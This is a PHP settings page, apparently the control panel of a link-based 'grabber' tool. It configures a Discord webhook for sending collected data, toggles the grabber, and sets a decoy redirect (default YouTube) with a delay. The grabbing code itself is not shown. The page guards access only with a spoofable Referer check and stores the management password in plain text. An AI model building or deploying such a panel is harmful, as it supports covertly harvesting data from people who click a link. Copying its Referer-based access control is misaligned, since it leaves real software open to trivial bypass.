<?php
require 'config.php';

if (isset($_SERVER['HTTP_REFERER'])) {
    $referrer = parse_url($_SERVER['HTTP_REFERER']);
    if ($referrer['path'] !== '/manage.php' && $referrer['path'] !== '/edit.php') {
        header('Location: index.php');
        exit();
    }
} else {
    header('Location: index.php');
    exit();
}

// Variablen initialisieren
$webhookEnabled = false;
$webhookUrl = '';
$managementPassword = '';
$redirectUrl = '';
$grabberStatus = 'on';
$redirectWaitTime = 0;


if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    if (isset($_POST['webhook_enabled'])) {
        $webhookEnabled = $_POST['webhook_enabled'] == 'on' ? true : false;
    }

    if (isset($_POST['webhook_url'])) {
        $webhookUrl = $_POST['webhook_url'];
    }

    if (isset($_POST['management_password'])) {
        $managementPassword = $_POST['management_password'];
    }

    if (isset($_POST['grabber_status'])) {
        $grabberStatus = $_POST['grabber_status'] == 'on' ? 'on' : 'off';
    }

    if (isset($_POST['redirect_url'])) {
        $redirectUrl = $_POST['redirect_url'];
    }

    if (isset($_POST['redirect_wait_time'])) {
        $redirectWaitTime = intval($_POST['redirect_wait_time']);
    }

    file_put_contents('config.json', json_encode([
        'webhook_enabled' => $webhookEnabled,
        'webhook_url' => $webhookUrl,
        'management_password' => $managementPassword,
        'grabber_status' => $grabberStatus,
        'redirect_url' => $redirectUrl,
        'redirect_wait_time' => $redirectWaitTime
    ]));

    header("Location: edit.php");
    exit;
}

$config = json_decode(file_get_contents('config.json'), true);
$webhookEnabled = isset($config['webhook_enabled']) ? $config['webhook_enabled'] : false;
$webhookUrl = isset($config['webhook_url']) ? $config['webhook_url'] : '';
$managementPassword = isset($config['management_password']) ? $config['management_password'] : '';
$grabberStatus = isset($config['grabber_status']) ? $config['grabber_status'] : 'on';
$redirectUrl = isset($config['redirect_url']) ? $config['redirect_url'] : 'https://youtube.com';
$redirectWaitTime = isset($config['redirect_wait_time']) ? $config['redirect_wait_time'] : 0;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Settings</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }
        h2 {
            text-align: center;
            color: #4CAF50;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .form-container {
            margin-top: 20px;
            background-color: #333;
            padding: 20px;
            border-radius: 8px;
        }
        .form-container input, .form-container select {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #222;
            color: #e0e0e0;
        }
        .form-container button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            border: none;
            font-size: 16px;
        }
        .form-container button:hover {
            background-color: #45a049;
        }
        .slider-container {
            margin-top: 20px;
        }
        .slider-label {
            display: inline-block;
            margin-bottom: 5px;
            font-size: 16px;
            color: #e0e0e0;
        }
        .slider {
            width: 100%;
            height: 10px;
            border-radius: 5px;
            background: #444;
            outline: none;
            transition: background 0.3s ease;
        }
        .slider::-webkit-slider-thumb {
            appearance: none;
            width: 20px;
            height: 20px;
            background: #4CAF50;
            border-radius: 50%;
            cursor: pointer;
        }
        .slider::-moz-range-thumb {
            width: 20px;
            height: 20px;
            background: #4CAF50;
            border-radius: 50%;
            cursor: pointer;
        }
        .slider-value {
            margin-top: 10px;
            font-size: 18px;
            font-weight: bold;
            color: #e0e0e0;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Edit Settings</h2>

    <div class="form-container">
        <form method="POST">
            <h3>Webhook Settings</h3>

            <label for="webhook_enabled">Webhook Enabled</label>
            <select name="webhook_enabled" id="webhook_enabled">
                <option value="on" <?= $webhookEnabled ? 'selected' : '' ?>>On</option>
                <option value="off" <?= !$webhookEnabled ? 'selected' : '' ?>>Off</option>
            </select>

            <label for="webhook_url">Discord Webhook URL</label>
            <input type="text" id="webhook_url" name="webhook_url" value="<?= htmlspecialchars($webhookUrl) ?>" placeholder="Enter Webhook URL">

            <h3>Management Settings</h3>

            <label for="management_password">Management Password</label>
            <input type="text" id="management_password" name="management_password" value="<?= htmlspecialchars($managementPassword) ?>" placeholder="Enter Management Password">

            <h3>Grabber Settings</h3>

            <label for="grabber_status">Grabber Status</label>
            <select name="grabber_status" id="grabber_status">
                <option value="on" <?= $grabberStatus == 'on' ? 'selected' : '' ?>>Enabled</option>
                <option value="off" <?= $grabberStatus == 'off' ? 'selected' : '' ?>>Disabled</option>
            </select>

            <h3>Redirect Settings</h3>

            <label for="redirect_url">Redirect URL</label>
            <input type="text" id="redirect_url" name="redirect_url" value="<?= htmlspecialchars($redirectUrl) ?>" placeholder="Enter Redirect URL">

            <div class="slider-container">
                <label class="slider-label" for="redirect_wait_time">Redirect Wait Time (seconds)</label>
                <input type="range" id="redirect_wait_time" name="redirect_wait_time" min="0" max="60" step="1" value="<?= $redirectWaitTime ?>" class="slider" />
                <div class="slider-value" id="slider_value"><?= $redirectWaitTime ?> seconds</div>
            </div>

            <button type="submit">Save Settings</button>
            <a href="manage.php" style="display:block; margin-top:10px; color: #4CAF50;">Back to Tabkes</a>
        </form>
    </div>
</div>

<script>
    const slider = document.getElementById('redirect_wait_time');
    const sliderValue = document.getElementById('slider_value');
    
    slider.addEventListener('input', function() {
        sliderValue.textContent = `${slider.value} seconds`;
    });
</script>

</body>
</html>
